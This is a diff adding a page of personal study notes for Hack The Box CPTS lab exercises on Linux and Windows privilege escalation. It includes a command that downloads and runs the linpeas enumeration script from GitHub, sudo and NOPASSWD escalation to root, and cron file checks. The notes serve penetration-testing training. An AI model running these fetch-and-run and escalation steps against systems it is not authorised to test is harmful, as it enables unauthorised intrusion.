@@ -1,0 +1,1217 @@
+
+<!DOCTYPE html>
+
+
+<html lang="en" data-content_root="../../" >
+
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" /><meta name="viewport" content="width=device-width, initial-scale=1" />
+
+    <title>1.7. HTB CPTS Moduals &#8212; Cybersecurity QuickStart</title>
+  
+  
+  
+  <script data-cfasync="false">
+    document.documentElement.dataset.mode = localStorage.getItem("mode") || "";
+    document.documentElement.dataset.theme = localStorage.getItem("theme") || "light";
+  </script>
+  
+  <!-- Loaded before other Sphinx assets -->
+  <link href="../../_static/styles/theme.css?digest=8d27b9dea8ad943066ae" rel="stylesheet" />
+<link href="../../_static/styles/bootstrap.css?digest=8d27b9dea8ad943066ae" rel="stylesheet" />
+<link href="../../_static/styles/pydata-sphinx-theme.css?digest=8d27b9dea8ad943066ae" rel="stylesheet" />
+
+  
+  <link href="../../_static/vendor/fontawesome/6.5.1/css/all.min.css?digest=8d27b9dea8ad943066ae" rel="stylesheet" />
+  <link rel="preload" as="font" type="font/woff2" crossorigin href="../../_static/vendor/fontawesome/6.5.1/webfonts/fa-solid-900.woff2" />
+<link rel="preload" as="font" type="font/woff2" crossorigin href="../../_static/vendor/fontawesome/6.5.1/webfonts/fa-brands-400.woff2" />
+<link rel="preload" as="font" type="font/woff2" crossorigin href="../../_static/vendor/fontawesome/6.5.1/webfonts/fa-regular-400.woff2" />
+
+    <link rel="stylesheet" type="text/css" href="../../_static/pygments.css?v=b76e3c8a" />
+    <link rel="stylesheet" type="text/css" href="../../_static/styles/sphinx-book-theme.css?v=384b581d" />
+    <link rel="stylesheet" type="text/css" href="../../_static/togglebutton.css?v=13237357" />
+    <link rel="stylesheet" type="text/css" href="../../_static/copybutton.css?v=76b2166b" />
+    <link rel="stylesheet" type="text/css" href="../../_static/mystnb.4510f1fc1dee50b3e5859aac5469c37c29e427902b24a333a5f9fcb2f0b3ac41.css?v=be8a1c11" />
+    <link rel="stylesheet" type="text/css" href="../../_static/sphinx-thebe.css?v=4fa983c6" />
+    <link rel="stylesheet" type="text/css" href="../../_static/design-style.1e8bd061cd6da7fc9cf755528e8ffc24.min.css?v=0a3b3ea7" />
+  
+  <!-- Pre-loaded scripts that we'll load fully later -->
+  <link rel="preload" as="script" href="../../_static/scripts/bootstrap.js?digest=8d27b9dea8ad943066ae" />
+<link rel="preload" as="script" href="../../_static/scripts/pydata-sphinx-theme.js?digest=8d27b9dea8ad943066ae" />
+  <script src="../../_static/vendor/fontawesome/6.5.1/js/all.min.js?digest=8d27b9dea8ad943066ae"></script>
+
+    <script src="../../_static/documentation_options.js?v=9eb32ce0"></script>
+    <script src="../../_static/doctools.js?v=888ff710"></script>
+    <script src="../../_static/sphinx_highlight.js?v=dc90522c"></script>
+    <script src="../../_static/clipboard.min.js?v=a7894cd8"></script>
+    <script src="../../_static/copybutton.js?v=f281be69"></script>
+    <script src="../../_static/scripts/sphinx-book-theme.js?v=efea14e4"></script>
+    <script>let toggleHintShow = 'Click to show';</script>
+    <script>let toggleHintHide = 'Click to hide';</script>
+    <script>let toggleOpenOnPrint = 'true';</script>
+    <script src="../../_static/togglebutton.js?v=4a39c7ea"></script>
+    <script>var togglebuttonSelector = '.toggle, .admonition.dropdown';</script>
+    <script src="../../_static/design-tabs.js?v=36754332"></script>
+    <script>const THEBE_JS_URL = "https://unpkg.com/thebe@0.8.2/lib/index.js"; const thebe_selector = ".thebe,.cell"; const thebe_selector_input = "pre"; const thebe_selector_output = ".output, .cell_output"</script>
+    <script async="async" src="../../_static/sphinx-thebe.js?v=c100c467"></script>
+    <script>var togglebuttonSelector = '.toggle, .admonition.dropdown';</script>
+    <script>const THEBE_JS_URL = "https://unpkg.com/thebe@0.8.2/lib/index.js"; const thebe_selector = ".thebe,.cell"; const thebe_selector_input = "pre"; const thebe_selector_output = ".output, .cell_output"</script>
+    <script>DOCUMENTATION_OPTIONS.pagename = 'docs/cybersecurity/cpts';</script>
+    <link rel="index" title="Index" href="../../genindex.html" />
+    <link rel="search" title="Search" href="../../search.html" />
+    <link rel="next" title="2. Welcome to C Programming Language" href="../c/c_intro.html" />
+    <link rel="prev" title="1.6. CompTIA CySA+ (CS0-003)" href="cysa.html" />
+  <meta name="viewport" content="width=device-width, initial-scale=1"/>
+  <meta name="docsearch:language" content="en"/>
+  </head>
+  
+  
+  <body data-bs-spy="scroll" data-bs-target=".bd-toc-nav" data-offset="180" data-bs-root-margin="0px 0px -60%" data-default-mode="">
+
+  
+  
+  <a id="pst-skip-link" class="skip-link" href="#main-content">Skip to main content</a>
+  
+  <div id="pst-scroll-pixel-helper"></div>
+  
+  <button type="button" class="btn rounded-pill" id="pst-back-to-top">
+    <i class="fa-solid fa-arrow-up"></i>
+    Back to top
+  </button>
+
+  
+  <input type="checkbox"
+          class="sidebar-toggle"
+          name="__primary"
+          id="__primary"/>
+  <label class="overlay overlay-primary" for="__primary"></label>
+  
+  <input type="checkbox"
+          class="sidebar-toggle"
+          name="__secondary"
+          id="__secondary"/>
+  <label class="overlay overlay-secondary" for="__secondary"></label>
+  
+  <div class="search-button__wrapper">
+    <div class="search-button__overlay"></div>
+    <div class="search-button__search-container">
+<form class="bd-search d-flex align-items-center"
+      action="../../search.html"
+      method="get">
+  <i class="fa-solid fa-magnifying-glass"></i>
+  <input type="search"
+         class="form-control"
+         name="q"
+         id="search-input"
+         placeholder="Search this book..."
+         aria-label="Search this book..."
+         autocomplete="off"
+         autocorrect="off"
+         autocapitalize="off"
+         spellcheck="false"/>
+  <span class="search-button__kbd-shortcut"><kbd class="kbd-shortcut__modifier">Ctrl</kbd>+<kbd>K</kbd></span>
+</form></div>
+  </div>
+  
+    <header class="bd-header navbar navbar-expand-lg bd-navbar">
+    </header>
+  
+
+  <div class="bd-container">
+    <div class="bd-container__inner bd-page-width">
+      
+      
+      
+      <div class="bd-sidebar-primary bd-sidebar">
+        
+
+  
+  <div class="sidebar-header-items sidebar-primary__section">
+    
+    
+    
+    
+  </div>
+  
+    <div class="sidebar-primary-items__start sidebar-primary__section">
+        <div class="sidebar-primary-item">
+
+  
+
+<a class="navbar-brand logo" href="../index.html">
+  
+  
+  
+  
+  
+    
+    
+      
+    
+    
+    <img src="../../_static/qe-logo-large.png" class="logo__image only-light" alt="Cybersecurity QuickStart - Home"/>
+    <script>document.write(`<img src="../../_static/qe-logo-large.png" class="logo__image only-dark" alt="Cybersecurity QuickStart - Home"/>`);</script>
+  
+  
+</a></div>
+        <div class="sidebar-primary-item">
+
+ <script>
+ document.write(`
+   <button class="btn navbar-btn search-button-field search-button__button" title="Search" aria-label="Search" data-bs-placement="bottom" data-bs-toggle="tooltip">
+    <i class="fa-solid fa-magnifying-glass"></i>
+    <span class="search-button__default-text">Search</span>
+    <span class="search-button__kbd-shortcut"><kbd class="kbd-shortcut__modifier">Ctrl</kbd>+<kbd class="kbd-shortcut__modifier">K</kbd></span>
+   </button>
+ `);
+ </script></div>
+        <div class="sidebar-primary-item"><nav class="bd-links bd-docs-nav" aria-label="Main">
+    <div class="bd-toc-item navbar-nav active">
+        <p aria-level="2" class="caption" role="heading"><span class="caption-text">Cybersecurity</span></p>
+<ul class="current nav bd-sidenav">
+<li class="toctree-l1 current active has-children"><a class="reference internal" href="cs_intro.html">1. Cybersecurity intro</a><input checked="" class="toctree-checkbox" id="toctree-checkbox-1" name="toctree-checkbox-1" type="checkbox"/><label class="toctree-toggle" for="toctree-checkbox-1"><i class="fa-solid fa-chevron-down"></i></label><ul class="current">
+<li class="toctree-l2"><a class="reference internal" href="linux.html">1.1. Linux Basics</a></li>
+<li class="toctree-l2"><a class="reference internal" href="sqlite.html">1.2. SQL General Commands</a></li>
+<li class="toctree-l2"><a class="reference internal" href="nmap.html">1.3. nmap Basic Commands and Examples</a></li>
+<li class="toctree-l2"><a class="reference internal" href="cheatSheet.html">1.4. Commands</a></li>
+<li class="toctree-l2"><a class="reference internal" href="ctf.html">1.5. CTF Write Ups</a></li>
+<li class="toctree-l2"><a class="reference internal" href="cysa.html">1.6. CompTIA CySA+ (CS0-003)</a></li>
+<li class="toctree-l2 current active"><a class="current reference internal" href="#">1.7. HTB CPTS Moduals</a></li>
+</ul>
+</li>
+</ul>
+<p aria-level="2" class="caption" role="heading"><span class="caption-text">C Programming Language</span></p>
+<ul class="nav bd-sidenav">
+<li class="toctree-l1 has-children"><a class="reference internal" href="../c/c_intro.html">2. Welcome to C Programming Language</a><input class="toctree-checkbox" id="toctree-checkbox-2" name="toctree-checkbox-2" type="checkbox"/><label class="toctree-toggle" for="toctree-checkbox-2"><i class="fa-solid fa-chevron-down"></i></label><ul>
+<li class="toctree-l2"><a class="reference internal" href="../c/struct.html">2.2. Basics of Data Structres</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../c/linkedlist.html">2.3. Linked Lists</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../c/final.html">2.4. APS 105 Final Review</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../c/searching.html">2.5. Searching Algorithms</a></li>
+</ul>
+</li>
+</ul>
+<p aria-level="2" class="caption" role="heading"><span class="caption-text">ECE</span></p>
+<ul class="nav bd-sidenav">
+<li class="toctree-l1 has-children"><a class="reference internal" href="../ece/ece_intro.html">3. ECE</a><input class="toctree-checkbox" id="toctree-checkbox-3" name="toctree-checkbox-3" type="checkbox"/><label class="toctree-toggle" for="toctree-checkbox-3"><i class="fa-solid fa-chevron-down"></i></label><ul>
+<li class="toctree-l2"><a class="reference internal" href="../ece/circuits_basics.html">3.2. Circuits Basics</a></li>
+</ul>
+</li>
+</ul>
+<p aria-level="2" class="caption" role="heading"><span class="caption-text">Backend Dev</span></p>
+<ul class="nav bd-sidenav">
+<li class="toctree-l1 has-children"><a class="reference internal" href="../backend/java_intro.html">4. Backend Roadmap</a><input class="toctree-checkbox" id="toctree-checkbox-4" name="toctree-checkbox-4" type="checkbox"/><label class="toctree-toggle" for="toctree-checkbox-4"><i class="fa-solid fa-chevron-down"></i></label><ul>
+<li class="toctree-l2"><a class="reference internal" href="../backend/java_basics.html">4.15. Java</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../backend/java_oop.html">4.16. Java OOP</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../backend/jb.html">4.17. Jupyter Book Basics</a></li>
+</ul>
+</li>
+</ul>
+
+    </div>
+</nav></div>
+    </div>
+  
+  
+  <div class="sidebar-primary-items__end sidebar-primary__section">
+  </div>
+  
+  <div id="rtd-footer-container"></div>
+
+
+      </div>
+      
+      <main id="main-content" class="bd-main">
+        
+        
+
+<div class="sbt-scroll-pixel-helper"></div>
+
+          <div class="bd-content">
+            <div class="bd-article-container">
+              
+              <div class="bd-header-article">
+<div class="header-article-items header-article__inner">
+  
+    <div class="header-article-items__start">
+      
+        <div class="header-article-item"><label class="sidebar-toggle primary-toggle btn btn-sm" for="__primary" title="Toggle primary sidebar" data-bs-placement="bottom" data-bs-toggle="tooltip">
+  <span class="fa-solid fa-bars"></span>
+</label></div>
+      
+    </div>
+  
+  
+    <div class="header-article-items__end">
+      
+        <div class="header-article-item">
+
+<div class="article-header-buttons">
+
+
+
+
+
+<div class="dropdown dropdown-download-buttons">
+  <button class="btn dropdown-toggle" type="button" data-bs-toggle="dropdown" aria-expanded="false" aria-label="Download this page">
+    <i class="fas fa-download"></i>
+  </button>
+  <ul class="dropdown-menu">
+      
+      
+      
+      <li><a href="../../_sources/docs/cybersecurity/cpts.md" target="_blank"
+   class="btn btn-sm btn-download-source-button dropdown-item"
+   title="Download source file"
+   data-bs-placement="left" data-bs-toggle="tooltip"
+>
+  
+
+<span class="btn__icon-container">
+  <i class="fas fa-file"></i>
+  </span>
+<span class="btn__text-container">.md</span>
+</a>
+</li>
+      
+      
+      
+      
+      <li>
+<button onclick="window.print()"
+  class="btn btn-sm btn-download-pdf-button dropdown-item"
+  title="Print to PDF"
+  data-bs-placement="left" data-bs-toggle="tooltip"
+>
+  
+
+<span class="btn__icon-container">
+  <i class="fas fa-file-pdf"></i>
+  </span>
+<span class="btn__text-container">.pdf</span>
+</button>
+</li>
+      
+  </ul>
+</div>
+
+
+
+
+<button onclick="toggleFullScreen()"
+  class="btn btn-sm btn-fullscreen-button"
+  title="Fullscreen mode"
+  data-bs-placement="bottom" data-bs-toggle="tooltip"
+>
+  
+
+<span class="btn__icon-container">
+  <i class="fas fa-expand"></i>
+  </span>
+
+</button>
+
+
+
+<script>
+document.write(`
+  <button class="btn btn-sm navbar-btn theme-switch-button" title="light/dark" aria-label="light/dark" data-bs-placement="bottom" data-bs-toggle="tooltip">
+    <span class="theme-switch nav-link" data-mode="light"><i class="fa-solid fa-sun fa-lg"></i></span>
+    <span class="theme-switch nav-link" data-mode="dark"><i class="fa-solid fa-moon fa-lg"></i></span>
+    <span class="theme-switch nav-link" data-mode="auto"><i class="fa-solid fa-circle-half-stroke fa-lg"></i></span>
+  </button>
+`);
+</script>
+
+
+<script>
+document.write(`
+  <button class="btn btn-sm navbar-btn search-button search-button__button" title="Search" aria-label="Search" data-bs-placement="bottom" data-bs-toggle="tooltip">
+    <i class="fa-solid fa-magnifying-glass fa-lg"></i>
+  </button>
+`);
+</script>
+<label class="sidebar-toggle secondary-toggle btn btn-sm" for="__secondary"title="Toggle secondary sidebar" data-bs-placement="bottom" data-bs-toggle="tooltip">
+    <span class="fa-solid fa-list"></span>
+</label>
+</div></div>
+      
+    </div>
+  
+</div>
+</div>
+              
+              
+
+<div id="jb-print-docs-body" class="onlyprint">
+    <h1>HTB CPTS Moduals</h1>
+    <!-- Table of contents -->
+    <div id="print-main-content">
+        <div id="jb-print-toc">
+            
+            <div>
+                <h2> Contents </h2>
+            </div>
+            <nav aria-label="Page">
+                <ul class="visible nav section-nav flex-column">
+<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#getting-started">1.7.1. Getting Started</a><ul class="nav section-nav flex-column">
+<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#web-enumeration">1.7.1.1. Web Enumeration</a></li>
+<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#priv-esc">1.7.1.2. Priv Esc</a><ul class="nav section-nav flex-column">
+<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#run-vuln-checklist-scripts">1.7.1.2.1. Run vuln checklist scripts</a></li>
+<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#ssh">1.7.1.2.2. ssh</a></li>
+<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#vuln-software">1.7.1.2.3. vuln software</a><ul class="nav section-nav flex-column">
+<li class="toc-h5 nav-item toc-entry"><a class="reference internal nav-link" href="#linux">1.7.1.2.3.1. linux</a></li>
+<li class="toc-h5 nav-item toc-entry"><a class="reference internal nav-link" href="#win">1.7.1.2.3.2. win</a></li>
+</ul>
+</li>
+<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#check-priv-avail">1.7.1.2.4. check priv avail</a><ul class="nav section-nav flex-column">
+<li class="toc-h5 nav-item toc-entry"><a class="reference internal nav-link" href="#sudo">1.7.1.2.4.1. sudo</a></li>
+<li class="toc-h5 nav-item toc-entry"><a class="reference internal nav-link" href="#nopasswd-entry">1.7.1.2.4.2. NOPASSWD entry</a></li>
+</ul>
+</li>
+<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#cron-jobs">1.7.1.2.5. Cron Jobs</a></li>
+<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#exposed-credentials">1.7.1.2.6. exposed credentials</a></li>
+<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#ssh-keys">1.7.1.2.7. ssh keys</a><ul class="nav section-nav flex-column">
+<li class="toc-h5 nav-item toc-entry"><a class="reference internal nav-link" href="#use-their-key">1.7.1.2.7.1. use their key</a></li>
+<li class="toc-h5 nav-item toc-entry"><a class="reference internal nav-link" href="#add-our-key">1.7.1.2.7.2. add our key</a></li>
+</ul>
+</li>
+<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#priv-esc-box">1.7.1.2.8. priv esc box</a><ul class="nav section-nav flex-column">
+<li class="toc-h5 nav-item toc-entry"><a class="reference internal nav-link" href="#horizontal-movement">1.7.1.2.8.1. horizontal movement</a></li>
+<li class="toc-h5 nav-item toc-entry"><a class="reference internal nav-link" href="#priv-esc-to-root">1.7.1.2.8.2. priv esc to root</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#transferring-files">1.7.1.3. Transferring files</a><ul class="nav section-nav flex-column">
+<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#wget">1.7.1.3.1. wget</a></li>
+</ul>
+</li>
+<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#nibbles">1.7.1.4. Nibbles</a><ul class="nav section-nav flex-column">
+<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#web-footprinting">1.7.1.4.1. web footprinting</a><ul class="nav section-nav flex-column">
+<li class="toc-h5 nav-item toc-entry"><a class="reference internal nav-link" href="#dir-enum">1.7.1.4.1.1. Dir Enum</a></li>
+</ul>
+</li>
+<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#initial-foothold">1.7.1.4.2. Initial Foothold</a><ul class="nav section-nav flex-column">
+<li class="toc-h5 nav-item toc-entry"><a class="reference internal nav-link" href="#enum-using-script">1.7.1.4.2.1. enum using script</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#knowledge-check">1.7.1.5. Knowledge check</a></li>
+</ul>
+</li>
+</ul>
+            </nav>
+        </div>
+    </div>
+</div>
+
+              
+                
+<div id="searchbox"></div>
+                <article class="bd-article">
+                  
+  <section class="tex2jax_ignore mathjax_ignore" id="htb-cpts-moduals">
+<h1><span class="section-number">1.7. </span>HTB CPTS Moduals<a class="headerlink" href="#htb-cpts-moduals" title="Link to this heading">#</a></h1>
+<section id="getting-started">
+<h2><span class="section-number">1.7.1. </span>Getting Started<a class="headerlink" href="#getting-started" title="Link to this heading">#</a></h2>
+<section id="web-enumeration">
+<h3><span class="section-number">1.7.1.1. </span>Web Enumeration<a class="headerlink" href="#web-enumeration" title="Link to this heading">#</a></h3>
+</section>
+<section id="priv-esc">
+<h3><span class="section-number">1.7.1.2. </span>Priv Esc<a class="headerlink" href="#priv-esc" title="Link to this heading">#</a></h3>
+<section id="run-vuln-checklist-scripts">
+<h4><span class="section-number">1.7.1.2.1. </span>Run vuln checklist scripts<a class="headerlink" href="#run-vuln-checklist-scripts" title="Link to this heading">#</a></h4>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>curl<span class="w"> </span>-L<span class="w"> </span>-o<span class="w"> </span>linpeas.sh<span class="w"> </span>https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
+
+chmod<span class="w"> </span>+x<span class="w"> </span>linpeas.sh
+
+./linpeas.sh
+</pre></div>
+</div>
+</section>
+<section id="ssh">
+<h4><span class="section-number">1.7.1.2.2. </span>ssh<a class="headerlink" href="#ssh" title="Link to this heading">#</a></h4>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>┌─<span class="o">[</span>us-academy-2<span class="o">]</span>─<span class="o">[</span><span class="m">10</span>.10.14.34<span class="o">]</span>─<span class="o">[</span>htb-ac-1136328@htb-jctqq3hoo2<span class="o">]</span>─<span class="o">[</span>~<span class="o">]</span>
+└──╼<span class="w"> </span><span class="o">[</span>★<span class="o">]</span>$<span class="w"> </span>ssh<span class="w"> </span>-p<span class="w"> </span><span class="m">36803</span><span class="w"> </span>user1@83.136.253.251
+
+
+<span class="nb">exit</span>
+</pre></div>
+</div>
+</section>
+<section id="vuln-software">
+<h4><span class="section-number">1.7.1.2.3. </span>vuln software<a class="headerlink" href="#vuln-software" title="Link to this heading">#</a></h4>
+<section id="linux">
+<h5><span class="section-number">1.7.1.2.3.1. </span>linux<a class="headerlink" href="#linux" title="Link to this heading">#</a></h5>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+└─$<span class="w"> </span>dpkg<span class="w"> </span>-l<span class="w">        </span>
+<span class="nv">Desired</span><span class="o">=</span>Unknown/Install/Remove/Purge/Hold
+<span class="p">|</span><span class="w"> </span><span class="nv">Status</span><span class="o">=</span>Not/Inst/Conf-files/Unpacked/halF-conf/Half-inst/trig-aWait/Trig-pend
+<span class="p">|</span>/<span class="w"> </span>Err?<span class="o">=(</span>none<span class="o">)</span>/Reinst-required<span class="w"> </span><span class="o">(</span>Status,Err:<span class="w"> </span><span class="nv">uppercase</span><span class="o">=</span>bad<span class="o">)</span>
+<span class="o">||</span>/<span class="w"> </span>Name<span class="w">                                   </span>Version<span class="w">                              </span>Architecture<span class="w"> </span>Description
++++-<span class="o">======================================</span>-<span class="o">====================================</span>-<span class="o">============</span>-<span class="o">======================</span>&gt;
+ii<span class="w">  </span>acl<span class="w">                                    </span><span class="m">2</span>.3.1-3<span class="w">                              </span>amd64<span class="w">        </span>access<span class="w"> </span>control<span class="w"> </span>list<span class="w"> </span>-<span class="w"> </span>&gt;
+ii<span class="w">  </span>adduser<span class="w">                                </span><span class="m">3</span>.132<span class="w">                                </span>all<span class="w">          </span>add<span class="w"> </span>and<span class="w"> </span>remove<span class="w"> </span>users<span class="w"> </span>a&gt;
+ii<span class="w">  </span>adwaita-icon-theme<span class="w">                     </span><span class="m">43</span>-1<span class="w">                                 </span>all<span class="w">          </span>default<span class="w"> </span>icon<span class="w"> </span>theme<span class="w"> </span>of<span class="w"> </span>&gt;
+ii<span class="w">  </span>aircrack-ng<span class="w">                            </span><span class="m">1</span>:1.7-5<span class="w">                              </span>amd64<span class="w">        </span>wireless<span class="w"> </span>WEP/WPA<span class="w"> </span>crack&gt;
+ii<span class="w">  </span>alsa-topology-conf<span class="w">                     </span><span class="m">1</span>.2.5.1-2<span class="w">                            </span>all<span class="w">          </span>ALSA<span class="w"> </span>topology<span class="w"> </span>configur&gt;
+ii<span class="w">  </span>alsa-ucm-conf<span class="w">                          </span><span class="m">1</span>.2.8-1<span class="w">                              </span>all<span class="w">          </span>ALSA<span class="w"> </span>Use<span class="w"> </span>Case<span class="w"> </span>Manager<span class="w"> </span>&gt;
+ii<span class="w">  </span>amass<span class="w">                                  </span><span class="m">3</span>.23.2-0kali1<span class="w">                        </span>amd64<span class="w">        </span>In-depth<span class="w"> </span>DNS<span class="w"> </span>Enumerati&gt;
+ii<span class="w">  </span>amass-common<span class="w">                           </span><span class="m">3</span>.23.2-0kali1<span class="w">                        </span>all<span class="w">          </span>In-depth<span class="w"> </span>
+</pre></div>
+</div>
+</section>
+<section id="win">
+<h5><span class="section-number">1.7.1.2.3.2. </span>win<a class="headerlink" href="#win" title="Link to this heading">#</a></h5>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>C:<span class="se">\P</span>rogram<span class="w"> </span>Files&gt;dir
+<span class="w"> </span>Volume<span class="w"> </span><span class="k">in</span><span class="w"> </span>drive<span class="w"> </span>C<span class="w"> </span>is<span class="w"> </span>OS
+<span class="w"> </span>Volume<span class="w"> </span>Serial<span class="w"> </span>Number<span class="w"> </span>is<span class="w"> </span><span class="m">1206</span>-0611
+
+<span class="w"> </span>Directory<span class="w"> </span>of<span class="w"> </span>C:<span class="se">\P</span>rogram<span class="w"> </span>Files
+
+<span class="m">2024</span>-05-09<span class="w">  </span><span class="m">08</span>:35<span class="w"> </span>AM<span class="w">    </span>&lt;DIR&gt;<span class="w">          </span>.
+<span class="m">2024</span>-02-19<span class="w">  </span><span class="m">07</span>:43<span class="w"> </span>AM<span class="w">    </span>&lt;DIR&gt;<span class="w">          </span>4KDownload
+<span class="m">2020</span>-08-07<span class="w">  </span><span class="m">03</span>:14<span class="w"> </span>PM<span class="w">    </span>&lt;DIR&gt;<span class="w">          </span><span class="m">7</span>-Zip
+<span class="m">2022</span>-08-02<span class="w">  </span><span class="m">01</span>:11<span class="w"> </span>AM<span class="w">    </span>&lt;DIR&gt;<span class="w">          </span>Adobe
+<span class="m">2020</span>-05-21<span class="w">  </span><span class="m">05</span>:51<span class="w"> </span>PM<span class="w">    </span>&lt;DIR&gt;<span class="w">          </span>Alienware
+<span class="m">2022</span>-03-29<span class="w">  </span><span class="m">08</span>:29<span class="w"> </span>PM<span class="w">    </span>&lt;DIR&gt;<span class="w">          </span>AnthemScore
+<span class="m">2023</span>-11-01<span class="w">  </span><span class="m">06</span>:35<span class="w"> </span>AM<span class="w">    </span>&lt;DIR&gt;<span class="w">          </span>Application<span class="w"> </span>Verifier
+</pre></div>
+</div>
+</section>
+</section>
+<section id="check-priv-avail">
+<h4><span class="section-number">1.7.1.2.4. </span>check priv avail<a class="headerlink" href="#check-priv-avail" title="Link to this heading">#</a></h4>
+<section id="sudo">
+<h5><span class="section-number">1.7.1.2.4.1. </span>sudo<a class="headerlink" href="#sudo" title="Link to this heading">#</a></h5>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+└─$<span class="w"> </span>sudo<span class="w"> </span>-l<span class="w">             </span>
+<span class="o">[</span>sudo<span class="o">]</span><span class="w"> </span>password<span class="w"> </span><span class="k">for</span><span class="w"> </span>kali:<span class="w"> </span>
+Matching<span class="w"> </span>Defaults<span class="w"> </span>entries<span class="w"> </span><span class="k">for</span><span class="w"> </span>kali<span class="w"> </span>on<span class="w"> </span>kali:
+<span class="w">    </span>env_reset,<span class="w"> </span>mail_badpass,<span class="w"> </span><span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin,<span class="w"> </span>use_pty
+
+User<span class="w"> </span>kali<span class="w"> </span>may<span class="w"> </span>run<span class="w"> </span>the<span class="w"> </span>following<span class="w"> </span>commands<span class="w"> </span>on<span class="w"> </span>kali:
+<span class="w">    </span><span class="o">(</span>ALL<span class="w"> </span>:<span class="w"> </span>ALL<span class="o">)</span><span class="w"> </span>ALL
+</pre></div>
+</div>
+<p>switch to the root user</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+└─$<span class="w"> </span>sudo<span class="w"> </span>su<span class="w">  </span>
+┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>/home/kali<span class="o">]</span>
+└─#<span class="w"> </span>whoami
+root
+</pre></div>
+</div>
+</section>
+<section id="nopasswd-entry">
+<h5><span class="section-number">1.7.1.2.4.2. </span>NOPASSWD entry<a class="headerlink" href="#nopasswd-entry" title="Link to this heading">#</a></h5>
+<ol class="arabic simple">
+<li><p>find a specific app that can run with sudo</p></li>
+<li><p>try to gie to the root shell</p></li>
+</ol>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>FallenOverlord@htb<span class="o">[</span>/htb<span class="o">]</span>$<span class="w"> </span>sudo<span class="w"> </span>-l
+
+<span class="w">    </span><span class="o">(</span>user<span class="w"> </span>:<span class="w"> </span>user<span class="o">)</span><span class="w"> </span>NOPASSWD:<span class="w"> </span>/bin/echo
+
+FallenOverlord@htb<span class="o">[</span>/htb<span class="o">]</span>$<span class="w"> </span>sudo<span class="w"> </span>-u<span class="w"> </span>user<span class="w"> </span>/bin/echo<span class="w"> </span>Hello<span class="w"> </span>World!
+
+<span class="w">    </span>Hello<span class="w"> </span>World!
+</pre></div>
+</div>
+<p><a class="reference external" href="https://gtfobins.github.io/">list of commands to priv esc thru sudo</a>
+<a class="reference external" href="https://lolbas-project.github.io/#">priv esc thru win app</a></p>
+</section>
+</section>
+<section id="cron-jobs">
+<h4><span class="section-number">1.7.1.2.5. </span>Cron Jobs<a class="headerlink" href="#cron-jobs" title="Link to this heading">#</a></h4>
+<p>schduled jobs, done priodically</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>/etc/crontab
+/etc/cron.d
+/var/spool/cron/crontabs/root
+</pre></div>
+</div>
+<p>check wiring primissions</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+└─$<span class="w"> </span>ls<span class="w"> </span>-l<span class="w"> </span>/etc/cron.d/
+
+total<span class="w"> </span><span class="m">20</span>
+-rw-r--r--<span class="w"> </span><span class="m">1</span><span class="w"> </span>root<span class="w"> </span>root<span class="w"> </span><span class="m">201</span><span class="w"> </span>Mar<span class="w">  </span><span class="m">5</span><span class="w">  </span><span class="m">2023</span><span class="w"> </span>e2scrub_all
+-rw-r--r--<span class="w"> </span><span class="m">1</span><span class="w"> </span>root<span class="w"> </span>root<span class="w"> </span><span class="m">607</span><span class="w"> </span>Nov<span class="w"> </span><span class="m">10</span><span class="w">  </span><span class="m">2022</span><span class="w"> </span>john
+-rw-r--r--<span class="w"> </span><span class="m">1</span><span class="w"> </span>root<span class="w"> </span>root<span class="w"> </span><span class="m">140</span><span class="w"> </span>Jan<span class="w"> </span><span class="m">17</span><span class="w">  </span><span class="m">2023</span><span class="w"> </span>ntpsec
